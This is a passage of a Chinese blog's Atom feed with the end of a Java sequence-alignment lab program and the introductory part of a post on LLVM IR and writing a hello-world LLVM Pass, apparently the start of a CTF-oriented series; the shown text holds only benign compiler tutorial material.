class="hljs-keyword">static</span> String Y=<span class="hljs-string">"government"</span>;<br>    <span class="hljs-keyword">static</span> String aY=<span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">static</span> String aX=<span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> d=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[][] A=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">26</span>][<span class="hljs-number">26</span>];<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[][] M=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][m];<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> mL=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">static</span>{<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">26</span>;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">26</span>;j++){<br>                <span class="hljs-keyword">if</span>(i==j){<br>                    A[i][j]=<span class="hljs-number">0</span>;<br>                }<span class="hljs-keyword">else</span>{<br>                    A[i][j]=d*<span class="hljs-number">2</span>;<br>                }<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">static</span> String elpha[]={<span class="hljs-string">"a"</span>,<span class="hljs-string">"b"</span>,<span class="hljs-string">"c"</span>,<span class="hljs-string">"d"</span>,<span class="hljs-string">"e"</span>,<span class="hljs-string">"f"</span>,<span class="hljs-string">"g"</span>,<span class="hljs-string">"h"</span>,<span class="hljs-string">"i"</span>,<span class="hljs-string">"j"</span>,<span class="hljs-string">"k"</span>,<span class="hljs-string">"l"</span>,<span class="hljs-string">"m"</span>,<span class="hljs-string">"n"</span>,<br>                          <span class="hljs-string">"o"</span>,<span class="hljs-string">"p"</span>,<span class="hljs-string">"q"</span>,<span class="hljs-string">"r"</span>,<span class="hljs-string">"s"</span>,<span class="hljs-string">"t"</span>,<span class="hljs-string">"u"</span>,<span class="hljs-string">"v"</span>,<span class="hljs-string">"w"</span>,<span class="hljs-string">"x"</span>,<span class="hljs-string">"y"</span>,<span class="hljs-string">"z"</span>};<br>    <span class="hljs-keyword">static</span> Integer index[]={<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<br>                            <span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>};<br>    <span class="hljs-keyword">static</span> Hashtable&lt;String,Integer&gt; ht=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;String,Integer&gt;();<br>    <span class="hljs-keyword">static</span>{<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">26</span>;i++){<br>            ht.put(elpha[i],index[i]);<br>        }<br>    }<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[][] optC=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[m+<span class="hljs-number">1</span>][n+<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">static</span> {<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=m;j++){<br>            optC[j][<span class="hljs-number">0</span>]=j*d;<br>        }<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=n;j++){<br>            optC[<span class="hljs-number">0</span>][j]=j*d;<br>        }<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        computeOPT();<br>        System.out.println(<span class="hljs-string">"最优匹配代价值为: "</span>+optC[m][n]);<br>        System.out.println(<span class="hljs-string">"最优匹配集为: "</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;mL;i++){<br>            System.out.print(<span class="hljs-string">"("</span>+M[<span class="hljs-number">0</span>][i]+<span class="hljs-string">","</span>+M[<span class="hljs-number">1</span>][i]+<span class="hljs-string">")"</span>);<br>            <span class="hljs-keyword">if</span>(Math.floorMod(i+<span class="hljs-number">1</span>,<span class="hljs-number">4</span>)==<span class="hljs-number">0</span>)<br>                System.out.print(<span class="hljs-string">"\n"</span>);<br>        }<br>        System.out.print(<span class="hljs-string">"\n"</span>);<br>        System.out.println(aX);<br>        System.out.println(aY);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeOPT</span><span class="hljs-params">()</span>{<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++){<br>                <span class="hljs-type">int</span> zj1=A[(ht.get(X.substring(i-<span class="hljs-number">1</span>,i))).intValue()][(ht.get(Y.substring(j-<span class="hljs-number">1</span>,j))).intValue()]<br>                        +optC[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>                <span class="hljs-type">int</span> zj2=d+optC[i-<span class="hljs-number">1</span>][j];<br>                <span class="hljs-type">int</span> zj3=d+optC[i][j-<span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">if</span>(zj1&lt;zj2&amp;&amp;zj1&lt;zj3){<br>                    optC[i][j]=zj1;<br>                }<br>                <span class="hljs-keyword">if</span> (zj2&lt;=zj1&amp;&amp;zj2&lt;=zj3){<br>                    optC[i][j]=zj2;<br>                }<br>                <span class="hljs-keyword">if</span>(zj3&lt;=zj1&amp;&amp;zj3&lt;=zj2){<br>                    optC[i][j]=zj3;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> i=m;<br>        <span class="hljs-type">int</span> j=n;<br>        <span class="hljs-keyword">while</span> (i&gt;=<span class="hljs-number">1</span>||j&gt;=<span class="hljs-number">1</span>){<br>            <span class="hljs-type">int</span> zj1=A[(ht.get(X.substring(i-<span class="hljs-number">1</span>,i))).intValue()][(ht.get(Y.substring(j-<span class="hljs-number">1</span>,j))).intValue()]<br>                    +optC[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>            <span class="hljs-type">int</span> zj2=d+optC[i-<span class="hljs-number">1</span>][j];<br>            <span class="hljs-type">int</span> zj3=d+optC[i][j-<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span>(zj1&lt;zj2&amp;&amp;zj1&lt;zj3){<br>                aX=X.substring(i-<span class="hljs-number">1</span>,i)+aX;<br>                aY=Y.substring(j-<span class="hljs-number">1</span>,j)+aY;<br>                M[<span class="hljs-number">0</span>][mL]=i;<br>                M[<span class="hljs-number">1</span>][mL]=j;<br>                mL=mL+<span class="hljs-number">1</span>;<br>                i--;<br>                j--;<br>            }<br>            <span class="hljs-keyword">if</span>(zj2&lt;=zj1&amp;&amp;zj2&lt;=zj3){<br>                aY=<span class="hljs-string">"-"</span>+aY;<br>                aX=X.substring(i-<span class="hljs-number">1</span>,i)+aX;<br>                i=i-<span class="hljs-number">1</span>;<br>            }<br>            <span class="hljs-keyword">if</span>(zj3&lt;=zj1&amp;&amp;zj3&lt;=zj2){<br>                aX=<span class="hljs-string">"-"</span>+aX;<br>                aY=Y.substring(j-<span class="hljs-number">1</span>,j)+aY;<br>                j=j-<span class="hljs-number">1</span>;<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;算法与程序设计实验&quot;&gt;&lt;a href=&quot;#算法与程序设计实验&quot; class=&quot;headerlink&quot; title=&quot;算法与程序设计实验&quot;&gt;&lt;/a&gt;算法与程序设计实验&lt;/h1&gt;&lt;p&gt;要求&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1.复现代码，写上自己的注释&lt;/p&gt;
</summary>
      
    
    
    
    <category term="算法与程序设计" scheme="https://kylinxin.github.io/categories/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="算法与程序设计实验" scheme="https://kylinxin.github.io/tags/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>LLVM PASS PWN（二）</title>
    <link href="https://kylinxin.github.io/2023/10/28/LLVM%20PASS%20PWN%20(%E4%BA%8C)/"/>
    <id>https://kylinxin.github.io/2023/10/28/LLVM%20PASS%20PWN%20(%E4%BA%8C)/</id>
    <published>2023-10-28T15:14:29.000Z</published>
    <updated>2023-10-28T15:02:55.367Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LLVM-PASS-PWN（二）"><a href="#LLVM-PASS-PWN（二）" class="headerlink" title="LLVM PASS PWN（二）"></a>LLVM PASS PWN（二）</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;LLVM-PASS-PWN（二）&quot;&gt;&lt;a href=&quot;#LLVM-PASS-PWN（二）&quot; class=&quot;headerlink&quot; title=&quot;LLVM PASS PWN（二）&quot;&gt;&lt;/a&gt;LLVM PASS PWN（二）&lt;/h1&gt;&lt;h2 id=&quot;&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="LLVM PASS PWN" scheme="https://kylinxin.github.io/categories/LLVM-PASS-PWN/"/>
    
    
    <category term="LLVM PASS PWN（二）" scheme="https://kylinxin.github.io/tags/LLVM-PASS-PWN%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>LLVM PASS PWN（一）</title>
    <link href="https://kylinxin.github.io/2023/10/28/LLVM%20PASS%20PWN%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://kylinxin.github.io/2023/10/28/LLVM%20PASS%20PWN%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2023-10-28T15:14:29.000Z</published>
    <updated>2023-10-28T14:56:33.522Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LLVM-PASS-PWN（一）"><a href="#LLVM-PASS-PWN（一）" class="headerlink" title="LLVM PASS PWN（一）"></a>LLVM PASS PWN（一）</h1><h2 id="前置知识简述"><a href="#前置知识简述" class="headerlink" title="前置知识简述"></a>前置知识简述</h2><h3 id="为什么要编译程序"><a href="#为什么要编译程序" class="headerlink" title="为什么要编译程序"></a>为什么要编译程序</h3><p>机器语言是用1和0组成的代码，但机器是识别不了1和0的，更具体的是如何识别的呢？对机器电路进行设计之后，机器能识别高电平还是低电平，刚好与2进制很相似，想输入0就给机器输入低电平，想输入1，就给机器输入高电平，所以就看到了1和0的表示形式</p><p>机器语言它是计算机唯一能识别和执行的语言，但它的直观性差，可读性差，比如一串<code>11110000111100001111</code>机器可以快速识别是什么但是我们很难理解，再比如我们想要在屏幕上输出hello world那我们该如何用二进制来表示呢，所以汇编语言就诞生了</p><p>汇编语言用助记符来表示机器指令中的操作码和操作数的指令系统，如a = 1，我们不需要去用二进制来理解，我们完全可以利用mov a, 1进行理解，那有没有更简单的方法呢，比如现在要输出hello wrold，还是需要十几行的汇编代码的，所以高级语言就诞生了</p><p>高级语言是一种更接近人类的自然语言和数学语言的语言，比如想要a = 1，很直观就是a = 1，在很大程度上减少编程人员的编写量</p><p>但是问题来了，机器只懂0和1那怎么才能让高级语言被机器识别，所以就有了编译，将高级语言（源语言）翻译成汇编语言或机器语言（目标语言），编译的根本目的就是把源代码变成目标代码</p><h3 id="编译的过程是什么"><a href="#编译的过程是什么" class="headerlink" title="编译的过程是什么"></a>编译的过程是什么</h3><p>编译过程主要可以划分为前端与后端，笔者用一张图简述一下</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/UiPnzvrVDGfkLhm.png'><img src="https://s2.loli.net/2023/10/28/UiPnzvrVDGfkLhm.png" alt="image.png"></p><p>前端把源代码翻译成IR，后端把IR编译成目标平台的机器码，这里笔者在查阅资料的时候发现有些会将生成中间代码放入前端，而有些资料会将生成中间代码放入后端</p><p>在词法分析中编译器读入源代码，经过词法分析器识别出Token，比如词法分析器中识别出的Token可以是<code>int, return, {, }</code>等</p><p>在语法分析中会把上面的Token串给转换成一个抽象语法树AST，AST树反映了程序的语法结构</p><p>在语义分析中需要做的任务是理解语义，语句要做什么，如for是需要去实现循环，if是判断等</p><p>在前端完成之后，会生成中间代码，统一优化中间代码，再去将中间代码生成目标代码</p><p>前置知识这里笔者简述了一下，具体的可以移步编译原理</p><ul><li><h2 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h2><h3 id="LLVM-IR-amp-LLVM-Pass"><a href="#LLVM-IR-amp-LLVM-Pass" class="headerlink" title="LLVM IR &amp; LLVM Pass"></a>LLVM IR &amp; LLVM Pass</h3><p><code>gcc</code>这个最经典的编译器提供的是一整套服务，前端和后端耦合在了一起，导致了如果一个新的编程语言出现可能需要设计一个新的IR以及实现这个IR的后端，如果出现了一个新的平台就要实现一个从自己的IR到新平台的后端，针对此类问题就出现了LLVM</p><p>不同的前后端使用统一的中间代码，这样一个新的编程语言出现只需要实现一个新的前端，如果出现了一个新的平台只需要实现一个新的后端</p><p>LLVM IR有三种表示形式</p><ul><li>可读IR，类似汇编代码，可以给人看的，后缀<code>.ll</code></li><li>不可读二进制IR，后缀<code>.bc</code></li><li>保存在内存中，内存格式</li></ul><p>LLVM Pass 是一个框架设计，是LLVM系统里重要的组成部分，因为LLVM Pass负责LLVM编译器绝大部分的工作，一系列的Pass组合，构建了编译器的转换和优化部分，抽象成结构化的编译器代码。</p><p>在实现上，LLVM的核心库中会给你一些 Pass类 去继承。你需要实现它的一些方法。 最后使用LLVM的编译器会把它翻译得到的IR传入Pass里，给你遍历和修改。</p><p>LLVM Pass的用处是插桩，机器无关的代码优化，静态分析，代码混淆等</p><h3 id="LLVM-工具"><a href="#LLVM-工具" class="headerlink" title="LLVM 工具"></a>LLVM 工具</h3><p>以下内容来自<a href="https://zhuanlan.zhihu.com/p/122522485">LLVM Pass入门导引</a></p><ul><li><code>llvm-as</code>：把LLVM IR从人类能看懂的文本格式汇编成二进制格式。注意：此处得到的<strong>不是</strong>目标平台的机器码。</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编。 不过这里的反汇编的对象是LLVM IR的二进制格式，而不是机器码。</li><li><code>opt</code>：优化LLVM IR。输出新的LLVM IR。</li><li><code>llc</code>：把LLVM IR编译成汇编码。需要用<code>as</code>进一步得到机器码。</li><li><code>lli</code>：解释执行LLVM IR。</li></ul><h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>Clang 是 LLVM 的前端，可以用来编译 C，C++，ObjectiveC 等语言。Clang 的功能包括：词法分析、语法分析、语义分析、生成中间中间代码LLVM Intermediate Representation (LLVM IR)。</p><h2 id="LLVM-amp-Clang环境安装-amp-工具测试"><a href="#LLVM-amp-Clang环境安装-amp-工具测试" class="headerlink" title="LLVM &amp; Clang环境安装 &amp; 工具测试"></a>LLVM &amp; Clang环境安装 &amp; 工具测试</h2><p>ubuntu20.04下安装LLVM + Clang如下</p><blockquote><p>sudo apt install clang-12</p><p>sudo apt install clang-8</p><p>sudo apt install llvm-12</p><p>sudo apt install llvm-8</p></blockquote><p>llvm-12安装之后可以使用opt-12，今年的ciscn的LLVM PASS PWN就是opt-12，一般题目都会给出opt的版本。ubuntu20.04应该自带opt-10如果没有的话，<code>sudo apt install clang-10 &amp;&amp; sudo apt install llvm-10</code></p><p>上面的做题环境都安装完成之后，先写一个c文件，利用Clang将c文件编译成<code>.ll, .bc</code>等格式看一下是否是如上所说，c文件如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>{<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"hello world"</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"plz input your name"</span>);<br>    read(<span class="hljs-number">0</span>, name, <span class="hljs-number">0x1F</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"biubiubiu"</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>首先是<code>.c-&gt;.ll</code>，<code>clang-12 -emit-llvm -S test.c -o test.ll</code>，test.ll(生成的IR文本文件)如下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs asm">; ModuleID = 'test.c'<br>source_filename = "test.c"<br>target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"<br>target triple = "x86_64-pc-linux-gnu"<br><br>@.str = private unnamed_addr constant [12 x i8] c"hello world\00", align 1<br>@.str.1 = private unnamed_addr constant [20 x i8] c"plz input your name\00", align 1<br>@.str.2 = private unnamed_addr constant [10 x i8] c"biubiubiu\00", align 1<br><br>; Function Attrs: noinline nounwind optnone uwtable<br>define dso_local i32 @main(i32 %0, i8** %1) #0 {<br>  %3 = alloca i32, align 4<br>  %4 = alloca i32, align 4<br>  %5 = alloca i8**, align 8<br>  %6 = alloca [32 x i8], align 16<br>  store i32 0, i32* %3, align 4<br>  store i32 %0, i32* %4, align 4<br>  store i8** %1, i8*** %5, align 8<br>  %7 = call i32 @puts(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0))<br>  %8 = call i32 @puts(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))<br>  %9 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 0<br>  %10 = call i64 @read(i32 0, i8* %9, i64 31)<br>  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))<br>  ret i32 0<br>}<br><br>declare dso_local i32 @puts(i8*) #1<br><br>declare dso_local i64 @read(i32, i8*, i64) #1<br><br>declare dso_local i32 @printf(i8*, ...) #1<br><br>attributes #0 = { noinline nounwind optnone uwtable "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }<br>attributes #1 = { "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }<br><br>!llvm.module.flags = !{!0}<br>!llvm.ident = !{!1}<br><br>!0 = !{i32 1, !"wchar_size", i32 4}<br>!1 = !{!"Ubuntu clang version 12.0.0-3ubuntu1~20.04.5"}<br></code></pre></td></tr></tbody></table></figure><p>上面的IR很直观，之前提到LLVM PASS的一个用处是优化IR代码，会将上面的可以优化的进行优化</p><p>其次是<code>.c-&gt;.bc</code>，<code>clang-12 -emit-llvm -c test.c -o test.bc</code>，bc是不可读二进制</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221014183446-d2d19954-4bab-1.png" class='item-img' data-src='https://xzfile.aliyuncs.com/media/upload/picture/20221014183446-d2d19954-4bab-1.png'><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221014183446-d2d19954-4bab-1.png" alt="img"></a></p><p>然后是<code>.ll -&gt; .bc</code>，<code>llvm-as test.ll -o test.bc</code>，结果和上面的一样</p><p>接着是<code>.bc - &gt; .ll</code>，<code>llvm-dis test.bc -o test.ll</code>，同上</p><p>最后还有一个<code>.bc -&gt; .s</code>， <code>llc test.bc -o test.s</code>，将字节码的二进制格式文件转换为本地的汇编文件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text<br>    .file   "test.c"<br>    .globl  main                    # -- Begin function main<br>    .p2align    4, 0x90<br>    .type   main,@function<br>main:                                   # @main<br>    .cfi_startproc<br># %bb.0:<br>    pushq   %rbp<br>    .cfi_def_cfa_offset 16<br>    .cfi_offset %rbp, -16<br>    movq    %rsp, %rbp<br>    .cfi_def_cfa_register %rbp<br>    subq    $48, %rsp<br>    movl    $0, -8(%rbp)<br>    movl    %edi, -4(%rbp)<br>    movq    %rsi, -16(%rbp)<br>    movabsq $.L.str, %rdi<br>    callq   puts<br>    movabsq $.L.str.1, %rdi<br>    callq   puts<br>    leaq    -48(%rbp), %rsi<br>    xorl    %edi, %edi<br>    movl    $31, %edx<br>    callq   read<br>    movabsq $.L.str.2, %rdi<br>    movb    $0, %al<br>    callq   printf<br>    xorl    %eax, %eax<br>    addq    $48, %rsp<br>    popq    %rbp<br>    .cfi_def_cfa %rsp, 8<br>    retq<br>.Lfunc_end0:<br>    .size   main, .Lfunc_end0-main<br>    .cfi_endproc<br>                                        # -- End function<br>    .type   .L.str,@object          # @.str<br>    .section    .rodata.str1.1,"aMS",@progbits,1<br>.L.str:<br>    .asciz  "hello world"<br>    .size   .L.str, 12<br><br>    .type   .L.str.1,@object        # @.str.1<br>.L.str.1:<br>    .asciz  "plz input your name"<br>    .size   .L.str.1, 20<br><br>    .type   .L.str.2,@object        # @.str.2<br>.L.str.2:<br>    .asciz  "biubiubiu"<br>    .size   .L.str.2, 10<br><br>    .ident  "Ubuntu clang version 12.0.0-3ubuntu1~20.04.5"<br>    .section    ".note.GNU-stack","",@progbits<br></code></pre></td></tr></tbody></table></figure><h2 id="编写第一个LLVM-Pass"><a href="#编写第一个LLVM-Pass" class="headerlink" title="编写第一个LLVM Pass"></a>编写第一个LLVM Pass</h2><p>通过前面的知识之后，现在可以尝试编写“hello world”的pass，下面是<a href="https://llvm.org/docs/WritingAnLLVMPass.html">官方</a>的示例</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/Pass.h"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/IR/Function.h"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/Support/raw_ostream.h"</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/IR/LegacyPassManager.h"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/Transforms/IPO/PassManagerBuilder.h"</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> {<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Hello</span> : <span class="hljs-keyword">public</span> FunctionPass {<br>  <span class="hljs-type">static</span> <span class="hljs-type">char</span> ID;<br>  <span class="hljs-built_in">Hello</span>() : <span class="hljs-built_in">FunctionPass</span>(ID) {}<br><br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> <span class="hljs-keyword">override</span> </span>{<br>    <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">"Hello: "</span>;<br>    <span class="hljs-built_in">errs</span>().<span class="hljs-built_in">write_escaped</span>(F.<span class="hljs-built_in">getName</span>()) &lt;&lt; <span class="hljs-string">'\n'</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  }<br>}; <span class="hljs-comment">// end of struct Hello</span><br>}  <span class="hljs-comment">// end of anonymous namespace</span><br><br><span class="hljs-type">char</span> Hello::ID = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-type">static</span> RegisterPass&lt;Hello&gt; <span class="hljs-title">X</span><span class="hljs-params">(<span class="hljs-string">"hello"</span>, <span class="hljs-string">"Hello World Pass"</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-literal">false</span> <span class="hljs-comment">/* Only looks at CFG */</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-literal">false</span> <span class="hljs-comment">/* Analysis Pass */</span>)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">static</span> RegisterStandardPasses <span class="hljs-title">Y</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PassManagerBuilder::EP_EarlyAsPossible,</span></span><br><span class="hljs-params"><span class="hljs-function">    [](<span class="hljs-type">const</span> PassManagerBuilder &amp;Builder,</span></span><br><span class="hljs-params"><span class="hljs-function">       legacy::PassManagerBase &amp;PM) { PM.add(<span class="hljs-keyword">new</span> Hello()); })</span></span>;<br></code></pre></td></tr></tbody></table></figure><p>先声明pass本身，然后声明了一个<code>Hello</code>类，它是FunctionPass的子类。稍后将详细描述不同的内置pass子类，但是现在知道FunctionPass一次对一个函数进行操作。</p><p>然后声明了LLVM用于标识pass的pass标识符。 这允许LLVM避免使用昂贵的C ++运行时信息，如下</p><figure class="highlight 